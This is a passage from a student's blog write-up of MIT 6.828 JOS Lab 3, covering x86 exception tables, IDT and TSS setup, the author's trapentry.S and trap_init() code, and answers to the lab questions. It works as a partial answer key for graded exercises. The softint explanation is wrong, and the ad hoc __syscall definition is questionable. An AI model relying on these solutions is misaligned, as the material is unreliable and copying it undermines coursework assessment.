class="hljs-keyword">fetch</span><br>Page fault                <span class="hljs-number">14</span>          YES             FAULT         <span class="hljs-keyword">Any</span> memory reference <span class="hljs-keyword">or</span> code<br><span class="hljs-keyword">fetch</span><br>Coprocessor error         <span class="hljs-number">16</span>          YES             FAULT<br>Coprocessor errors are reported <span class="hljs-keyword">as</span> a fault <span class="hljs-keyword">on</span> the first ESC <span class="hljs-keyword">or</span> WAIT<br>instruction executed <span class="hljs-keyword">after</span> the ESC instruction that caused the error.        ESC, WAIT<br>Two-byte SW Interrupt     <span class="hljs-number">0</span><span class="hljs-number">-255</span>       <span class="hljs-keyword">NO</span>              TRAP          <span class="hljs-type">INT</span> n<br></code></pre></td></tr></table></figure><blockquote><p>详细说明参见 <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm">https://pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm</a></p></blockquote><h4 id="Error-Code"><a href="#Error-Code" class="headerlink" title="Error Code"></a>Error Code</h4><p>若异常与一个特定的段相关联，则处理器会将一个错误代码存到异常处理程序的栈上，格式如下图所示</p><p><img src="https://s2.loli.net/2022/03/17/zTLnsmHUW2RVYue.png" alt="image.png"></p><p>在错误代码中并不包含特权级字段，取而代之的是两个新的位：</p><ul><li>EXT bit：程序外部的事件造成了异常</li><li>I-bit（IDT-bit）：错误代码的 index 字段引用 IDT 中的门描述符</li></ul><p>若未设置 I-bit，则 TI 位指示错误代码引用 GDT（0）还是 LDT（1），剩下的 14 位为段选择子的高 14 位</p><p>下表总结了异常中的错误代码信息：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Description                       Interrupt     <span class="hljs-built_in">Error</span> Code<br>Number<br><br>Divide <span class="hljs-built_in">error</span>                       0            <span class="hljs-literal">No</span><br><span class="hljs-built_in">Debug</span> exceptions                   1            <span class="hljs-literal">No</span><br>Breakpoint                         3            <span class="hljs-literal">No</span><br>Overflow                           4            <span class="hljs-literal">No</span><br>Bounds check                       5            <span class="hljs-literal">No</span><br>Invalid opcode                     6            <span class="hljs-literal">No</span><br>Coprocessor <span class="hljs-keyword">not</span> available          7            <span class="hljs-literal">No</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">System </span><span class="hljs-built_in">error</span>                       8            <span class="hljs-literal">Yes</span> (always 0)<br>Coprocessor Segment Overrun        9            <span class="hljs-literal">No</span><br>Invalid TSS                       10            <span class="hljs-literal">Yes</span><br>Segment <span class="hljs-keyword">not</span> present               11            <span class="hljs-literal">Yes</span><br>Stack exception                   12            <span class="hljs-literal">Yes</span><br>General protection fault          13            <span class="hljs-literal">Yes</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">Page </span>fault                        14            <span class="hljs-literal">Yes</span><br>Coprocessor <span class="hljs-built_in">error</span>                 16            <span class="hljs-literal">No</span><br>Two-byte SW interrupt             0-255         <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><h3 id="Basics-of-Protected-Control-Transfer"><a href="#Basics-of-Protected-Control-Transfer" class="headerlink" title="Basics of Protected Control Transfer"></a>Basics of Protected Control Transfer</h3><p>异常与中断都是“被保护的控制流切换”——将处理器切换至内核态（CPL&#x3D;0），且不会给用户态代码影响内核或其他环境的机会</p><p>在 Intel 术语中，一个中断通常是由处理器外部的异步事件触发的，例如外设的 I&#x2F;O；而异常则是由当前运行的代码同步触发的事件，例如非法内存访问</p><p>为了确保中断与异常“真正受到保护”，其被设计为：触发其的代码只能在特定条件下进入内核的特定位置，通过以下两种机制：</p><ul><li><strong>中断描述符表</strong>：处理器确保中断与异常只能通过特定的入口点进入内核，这便是中断描述符表中的「门」结构，x86允许多达 256 个不同的入口点——对应 256 个中断描述符表索引，处理器从该表中对应条目加载：<ul><li>eip：异常处理程序代码地址</li><li>cs：代码段选择子，在其 0 ~ 1 位中包含运行异常处理程序的特权级（在 JOS 中所有异常都在 0 特权级下处理）</li></ul></li><li><strong>任务状态段</strong>：处理器需要一个地方来保存中断发生前的上下文，以便在完成处理后恢复上下文，但这个区域不应当被用户进程访问，中断处理需要陷入内核，于是也需要独立的内核堆栈，因此<strong>任务状态段</strong>（TSS）结构指定了内核堆栈的地址与段选择子，处理器将旧的 ss、esp、eflags、cs、eip、（可选）error code 压到内核栈上，从中断描述符中加载 cs 与 eip，并设置 <code>ss:esp</code> 以引用新的堆栈</li></ul><p>我们在 JOS 中 TSS 仅用来定义从用户态切换到内核态时应切换到的内核堆栈，不使用其他字段</p><h3 id="Types-of-Exceptions-and-Interrupts"><a href="#Types-of-Exceptions-and-Interrupts" class="headerlink" title="Types of Exceptions and Interrupts"></a>Types of Exceptions and Interrupts</h3><p><del>说过了.jpg</del></p><p>本节我们将扩展 JOS 的 0 ~31 号异常向量，下一届我们将扩展软中断（0x30）作为 JOS 的系统调用入口点，在 lab4 中我们将扩展 JOS 以让其处理硬件中断（例如时钟中断）</p><h3 id="An-Example"><a href="#An-Example" class="headerlink" title="An Example"></a>An Example</h3><p><del>懒得看，反正就那回事</del></p><h3 id="Nested-Exceptions-and-Interrupts"><a href="#Nested-Exceptions-and-Interrupts" class="headerlink" title="Nested Exceptions and Interrupts"></a>Nested Exceptions and Interrupts</h3><p>对于内核中的嵌套中断而言不需要重复切换内核堆栈，只需要保存旧的上下文到内核堆栈上即可</p><h3 id="Setting-Up-the-IDT"><a href="#Setting-Up-the-IDT" class="headerlink" title="Setting Up the IDT"></a>Setting Up the IDT</h3><p>接下来我们将设置 IDT 的 0~31 号中断向量，随后我们会设置系统调用中断的处理程序，在后面的 lab 中设置 32 ~ 47 号中断（设备中断）</p><p>我们应当实现如下所示控制流程：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">      IDT                   trapentry.S         trap.c</span><br><span class="hljs-code">   </span><br><span class="hljs-code">+----------------+</span>                        <br>|   &amp;handler1    |---------&gt; handler1:          trap (struct Trapframe *tf)<br>|                |             // do stuff      &#123;<br>|                |             call trap          // handle the exception/interrupt<br><span class="hljs-section">|                |             // ...           &#125;</span><br><span class="hljs-section">+----------------+</span><br>|   &amp;handler2    |--------&gt; handler2:<br>|                |            // do stuff<br>|                |            call trap<br><span class="hljs-section">|                |            // ...</span><br><span class="hljs-section">+----------------+</span><br><span class="hljs-code">       .</span><br><span class="hljs-code">       .</span><br><span class="hljs-section">       .</span><br><span class="hljs-section">+----------------+</span><br>|   &amp;handlerX    |--------&gt; handlerX:<br>|                |             // do stuff<br>|                |             call trap<br><span class="hljs-section">|                |             // ...</span><br><span class="hljs-section">+----------------+</span><br></code></pre></td></tr></table></figure><p>每一个异常或中断都应在 <code>trapentry.S</code> 中有其自己的 handler，而 <code>trap_init()</code> 应当初始化这些 handler，每个 handler 应当在栈上建立一个 <code>struct Trapframe</code>（参见 <code>inc/trap.h</code>）并将其指针作为参数调用 <code>trap()</code>，由其对应调用到相应的处理函数</p><p>补充了那么多的基础知识，接下来是 Exercise 4——编辑 <code>trapentry.S</code> 与 <code>trap.c</code> 实现中断与异常处理</p><blockquote><p><strong>Exercise 4.</strong> Edit <code>trapentry.S</code> and <code>trap.c</code> and implement the features described above. The macros <code>TRAPHANDLER</code> and <code>TRAPHANDLER_NOEC</code> in <code>trapentry.S</code> should help you, as well as the T_* defines in <code>inc/trap.h</code>. You will need to add an entry point in <code>trapentry.S</code> (using those macros) for each trap defined in <code>inc/trap.h</code>, and you’ll have to provide <code>_alltraps</code> which the <code>TRAPHANDLER</code> macros refer to. You will also need to modify <code>trap_init()</code> to initialize the <code>idt</code> to point to each of these entry points defined in <code>trapentry.S</code>; the <code>SETGATE</code> macro will be helpful here.</p><p>Your <code>_alltraps</code> should:</p><ol><li>push values to make the stack look like a struct Trapframe</li><li>load <code>GD_KD</code> into <code>%ds</code> and <code>%es</code></li><li><code>pushl %esp</code> to pass a pointer to the Trapframe as an argument to trap()</li><li><code>call trap</code> (can <code>trap</code> ever return?)</li></ol><p>Consider using the <code>pushal</code> instruction; it fits nicely with the layout of the <code>struct Trapframe</code>.</p><p>Test your trap handling code using some of the test programs in the <code>user</code> directory that cause exceptions before making any system calls, such as <code>user/divzero</code>. You should be able to get make grade to succeed on the <code>divzero</code>, <code>softint</code>, and <code>badsegment</code> tests at this point.</p></blockquote><p>我们需要在 <code>trapentry.S</code> 中建立中断入口点，这里 JOS 预先为我们提供了两个宏用来声明这些入口点，他们最终都会跳转到 <code>_alltraps</code> 标号处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">* TRAPHANDLER defines a globally-visible function <span class="hljs-keyword">for</span> handling a trap.<br> * It pushes a trap number onto the <span class="hljs-built_in">stack</span>, then jumps to _alltraps.<br> * Use TRAPHANDLER <span class="hljs-keyword">for</span> traps where the CPU automatically pushes an error code.<br> *<br> * You shouldn<span class="hljs-number">&#x27;</span>t call a TRAPHANDLER function from C, but you may<br> * need to _declare_ one in <span class="hljs-title function_">C</span> <span class="hljs-params">(<span class="hljs-keyword">for</span> instance, to get a function pointer</span><br><span class="hljs-params"> * during IDT setup)</span>.  You can declare the function with<br> *   <span class="hljs-type">void</span> <span class="hljs-title function_">NAME</span><span class="hljs-params">()</span>;<br> * where NAME is the argument passed to TRAPHANDLER.<br> */<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRAPHANDLER(name, num)\</span><br><span class="hljs-meta">.globl name;<span class="hljs-comment">/* define global symbol for &#x27;name&#x27; */</span>\</span><br><span class="hljs-meta">.type name, @function;<span class="hljs-comment">/* symbol type is function */</span>\</span><br><span class="hljs-meta">.align 2;<span class="hljs-comment">/* align function definition */</span>\</span><br><span class="hljs-meta">name:<span class="hljs-comment">/* function starts here */</span>\</span><br><span class="hljs-meta">pushl $(num);\</span><br><span class="hljs-meta">jmp _alltraps</span><br><br><span class="hljs-comment">/* Use TRAPHANDLER_NOEC for traps where the CPU doesn&#x27;t push an error code.</span><br><span class="hljs-comment"> * It pushes a 0 in place of the error code, so the trap frame has the same</span><br><span class="hljs-comment"> * format in either case.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TRAPHANDLER_NOEC(name, num)\</span><br><span class="hljs-meta">.globl name;\</span><br><span class="hljs-meta">.type name, @function;\</span><br><span class="hljs-meta">.align 2;\</span><br><span class="hljs-meta">name:\</span><br><span class="hljs-meta">pushl $0;\</span><br><span class="hljs-meta">pushl $(num);\</span><br><span class="hljs-meta">jmp _alltraps</span><br></code></pre></td></tr></table></figure><p>我们先参照 <code>inc/trap.h</code> 中提供的 <code>T_*</code> 宏声明对应入口点，对于会有 error code 的中断使用 <code>TRAPHANDLER</code> 宏，否则使用 </p><p><code>TRAPHANDLER_NOEC</code> 宏，是否有 error code 参见上面的表格；宏里的 <code>name</code> 字段好像是可以随意声明的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Lab 3: Your code here for generating entry points for the different traps.</span><br><span class="hljs-comment"> */</span><br>TRAPHANDLER_NOEC(int0, T_DIVIDE)<br>TRAPHANDLER_NOEC(int1, T_DEBUG)<br>TRAPHANDLER_NOEC(int2, T_NMI)<br>TRAPHANDLER_NOEC(int3, T_BRKPT)<br>TRAPHANDLER_NOEC(int4, T_OFLOW)<br>TRAPHANDLER_NOEC(int5, T_BOUND)<br>TRAPHANDLER_NOEC(int6, T_ILLOP)<br>TRAPHANDLER_NOEC(int7, T_DEVICE)<br>TRAPHANDLER(int8, T_DBLFLT)<br><br>TRAPHANDLER(int10, T_TSS)<br>TRAPHANDLER(int11, T_SEGNP)<br>TRAPHANDLER(int12, T_STACK)<br>TRAPHANDLER(int13, T_GPFLT)<br>TRAPHANDLER(int14, T_PGFLT)<br><br>TRAPHANDLER_NOEC(int16, T_FPERR)<br>TRAPHANDLER_NOEC(__syscall, T_SYSCALL)<br></code></pre></td></tr></table></figure><p>之后就是实现 <code>_alltraps</code>，按注释我们应当向栈上压入对应数据形成一个 <code>Trapframe</code> 结构体，实际上只需要推入 es、ds、<code>PushRegs</code> 结构体，剩余的都会在我们运行到 <code>_alltraps</code> 前被压入栈上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PushRegs</span> &#123;</span><br><span class="hljs-comment">/* registers as pushed by pusha */</span><br><span class="hljs-type">uint32_t</span> reg_edi;<br><span class="hljs-type">uint32_t</span> reg_esi;<br><span class="hljs-type">uint32_t</span> reg_ebp;<br><span class="hljs-type">uint32_t</span> reg_oesp;<span class="hljs-comment">/* Useless */</span><br><span class="hljs-type">uint32_t</span> reg_ebx;<br><span class="hljs-type">uint32_t</span> reg_edx;<br><span class="hljs-type">uint32_t</span> reg_ecx;<br><span class="hljs-type">uint32_t</span> reg_eax;<br>&#125; __attribute__((packed));<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Trapframe</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PushRegs</span> <span class="hljs-title">tf_regs</span>;</span><br><span class="hljs-type">uint16_t</span> tf_es;<br><span class="hljs-type">uint16_t</span> tf_padding1;<br><span class="hljs-type">uint16_t</span> tf_ds;<br><span class="hljs-type">uint16_t</span> tf_padding2;<br><span class="hljs-type">uint32_t</span> tf_trapno;<br><span class="hljs-comment">/* below here defined by x86 hardware */</span><br><span class="hljs-type">uint32_t</span> tf_err;<br><span class="hljs-type">uintptr_t</span> tf_eip;<br><span class="hljs-type">uint16_t</span> tf_cs;<br><span class="hljs-type">uint16_t</span> tf_padding3;<br><span class="hljs-type">uint32_t</span> tf_eflags;<br><span class="hljs-comment">/* below here only when crossing rings, such as from user to kernel */</span><br><span class="hljs-type">uintptr_t</span> tf_esp;<br><span class="hljs-type">uint16_t</span> tf_ss;<br><span class="hljs-type">uint16_t</span> tf_padding4;<br>&#125; __attribute__((packed));<br></code></pre></td></tr></table></figure><p>这里的 padding 其实不需要我们手动压入栈上，我们在使用 <code>pushl</code> 指令压入 ds 与 es 时他们会自动扩展为 4 字节；之后我们还需要将 ds 与 es 的值设为 <code>GD_KD</code>，最后压入 esp 后手动调用 <code>trap()</code> 即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Lab 3: Your code here for _alltraps</span><br><span class="hljs-comment"> */</span><br><br>_alltraps:<br>pushl %ds<br>pushl %es<br>pushal<br>push $GD_KD<br>popl %ds<br>push $GD_KD<br>popl %es<br>pushl %esp<br>call trap<br></code></pre></td></tr></table></figure><p>最后使用 <code>SETGATE</code> 宏在 <code>trap_init()</code> 中装载中断描述符，其接收的第一个参数是一个 <code>Gatedesc</code> 类型结构体，用来表示一个门描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Gate descriptors for interrupts and traps</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Gatedesc</span> &#123;</span><br><span class="hljs-type">unsigned</span> gd_off_15_0 : <span class="hljs-number">16</span>;   <span class="hljs-comment">// low 16 bits of offset in segment</span><br><span class="hljs-type">unsigned</span> gd_sel : <span class="hljs-number">16</span>;        <span class="hljs-comment">// segment selector</span><br><span class="hljs-type">unsigned</span> gd_args : <span class="hljs-number">5</span>;        <span class="hljs-comment">// # args, 0 for interrupt/trap gates</span><br><span class="hljs-type">unsigned</span> gd_rsv1 : <span class="hljs-number">3</span>;        <span class="hljs-comment">// reserved(should be zero I guess)</span><br><span class="hljs-type">unsigned</span> gd_type : <span class="hljs-number">4</span>;        <span class="hljs-comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span><br><span class="hljs-type">unsigned</span> gd_s : <span class="hljs-number">1</span>;           <span class="hljs-comment">// must be 0 (system)</span><br><span class="hljs-type">unsigned</span> gd_dpl : <span class="hljs-number">2</span>;         <span class="hljs-comment">// descriptor(meaning new) privilege level</span><br><span class="hljs-type">unsigned</span> gd_p : <span class="hljs-number">1</span>;           <span class="hljs-comment">// Present</span><br><span class="hljs-type">unsigned</span> gd_off_31_16 : <span class="hljs-number">16</span>;  <span class="hljs-comment">// high bits of offset in segment</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>这里因为<strong>我们还没有定义任何处理函数所以直接声明新的函数即可</strong>，现在还没有出现陷阱所以都是普通的中断，这里注意系统调用与调试中断的特权级应设为3，因为用户进程需要能够访问其入口点：</p><blockquote><p>一开始笔者在想，好像还没有函数定义啊，后面看了一眼别人的实验报告，直接声明新的函数，还没有函数体，属实佩服…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">trap_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Segdesc</span> <span class="hljs-title">gdt</span>[];</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// declaration</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">int0</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int1</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int2</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int3</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int4</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int5</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int6</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int7</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int8</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">int10</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int11</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int12</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int13</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int14</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">int16</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> __syscall()<br>&#123;<br>cprintf(<span class="hljs-string">&quot;syscall!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// set up IDT</span><br>SETGATE(idt[T_DIVIDE], <span class="hljs-number">0</span>, GD_KT, int0, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_DEBUG], <span class="hljs-number">0</span>, GD_KT, int1, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_NMI], <span class="hljs-number">0</span>, GD_KT, int2, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_BRKPT], <span class="hljs-number">0</span>, GD_KT, int3, <span class="hljs-number">3</span>);<br>SETGATE(idt[T_OFLOW], <span class="hljs-number">0</span>, GD_KT, int4, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_BOUND], <span class="hljs-number">0</span>, GD_KT, int5, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_ILLOP], <span class="hljs-number">0</span>, GD_KT, int6, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_DEVICE], <span class="hljs-number">0</span>, GD_KT, int7, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_DBLFLT], <span class="hljs-number">0</span>, GD_KT, int8, <span class="hljs-number">0</span>);<br><br>SETGATE(idt[T_TSS], <span class="hljs-number">0</span>, GD_KT, int10, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_SEGNP], <span class="hljs-number">0</span>, GD_KT, int11, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_STACK], <span class="hljs-number">0</span>, GD_KT, int12, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_GPFLT], <span class="hljs-number">0</span>, GD_KT, int13, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_PGFLT], <span class="hljs-number">0</span>, GD_KT, int14, <span class="hljs-number">0</span>);<br><br>SETGATE(idt[T_FPERR], <span class="hljs-number">0</span>, GD_KT, int16, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_SYSCALL], <span class="hljs-number">0</span>, GD_KT, __syscall, <span class="hljs-number">3</span>);<br><br><span class="hljs-comment">// Per-CPU setup </span><br>trap_init_percpu();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里笔者将 syscall 定义为一个打印函数，运行效果如下，成功通过中断门完成了系统调用：</p><p><img src="https://s2.loli.net/2022/03/17/O9Y6lED152vKHIZ.png" alt="image.png"></p><p>当然，后面 panic 掉了，因为我们的中断处理程序没有完成</p><blockquote><p>这个时候运行评分程序应当有 30 分</p></blockquote><p>接下来看一下 Challenge，让我们自动化生成一个 table：</p><blockquote><p><em>Challenge!</em> You probably have a lot of very similar code right now, between the lists of <code>TRAPHANDLER</code> in <code>trapentry.S</code> and their installations in <code>trap.c</code>. Clean this up. Change the macros in <code>trapentry.S</code> to automatically generate a table for <code>trap.c</code> to use. Note that you can switch between laying down code and data in the assembler by using the directives <code>.text</code> and <code>.data</code>.</p></blockquote><p><del>不会做，摸了</del></p><p>最后是习题 Time：</p><blockquote><p><strong>Questions</strong></p><p>Answer the following questions in your <code>answers-lab3.txt</code>:</p><ol><li><p>What is the purpose of having an individual handler function for each exception&#x2F;interrupt? (i.e., if all exceptions&#x2F;interrupts were delivered to the same handler, what feature that exists in the current implementation could not be provided?)</p><p>笔者只能想到是为了降低代码的耦合性，因为其实并非是不能全部通过同一函数实现中断处理，只不过是把各个中断处理程序塞到中断入口点里罢了</p></li><li><p>Did you have to do anything to make the <code>user/softint</code> program behave correctly? The grade script expects it to produce a general protection fault (trap 13), but <code>softint</code>‘s code says <code>int $14</code>. <em>Why</em> should this produce interrupt vector 13? What happens if the kernel actually allows <code>softint</code>‘s <code>int $14</code> instruction to invoke the kernel’s page fault handler (which is interrupt vector 14)?</p><p>因为 General Protection Fault 属于 0 特权级，用户态无权限触发，因此在访问其向量时会触发 Page Fault</p></li></ol></blockquote><p>接下来进入 Part B，继续完善我们的中断处理程序</p><h2 id="Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls"><a href="#Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls" class="headerlink" title="Part B: Page Faults, Breakpoints Exceptions, and System Calls"></a>Part B: Page Faults, Breakpoints Exceptions, and System Calls</h2><p>本节中我们将改进中断处理代码以实现一些需要通过异常处理实现的重要的原语</p><h3 id="Handling-Page-Faults"><a href="#Handling-Page-Faults" class="headerlink" title="Handling Page Faults"></a>Handling Page Faults</h3><p>缺页异常是一个十分重要的机制，出于性能的考虑，我们并不需要在一开始就为对应线性地址分配物理页，而可以在访问到他们时触发缺页异常后再分配物理页（例如 mmap 映射区域）</p><p>当触发缺页异常时，处理器会将造成缺页异常的线性地址存放在 cr2 寄存器中，JOS 提供了一个缺页异常处理函数 <code>page_fault_handler()</code>，在接下来的 Exercise 5 中我们需要修改 <code>trap_dispatch()</code> 以处理缺页异常</p><blockquote><p><strong>Exercise 5.</strong> Modify <code>trap_dispatch()</code> to dispatch page fault exceptions to <code>page_fault_handler()</code>. You should now be able to get make grade to succeed on the <code>faultread</code>, <code>faultreadkernel</code>, <code>faultwrite</code>, and <code>faultwritekernel</code> tests. If any of them don’t work, figure out why and fix them. Remember that you can boot JOS into a particular user program using make run-<em>x</em> or make run-<em>x</em>-nox. For instance, make run-hello-nox runs the <em>hello</em> user program.</p></blockquote><p>笔者直接用一个大的 switch 进行操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">trap_dispatch</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-comment">// Handle processor exceptions.</span><br><span class="hljs-comment">// LAB 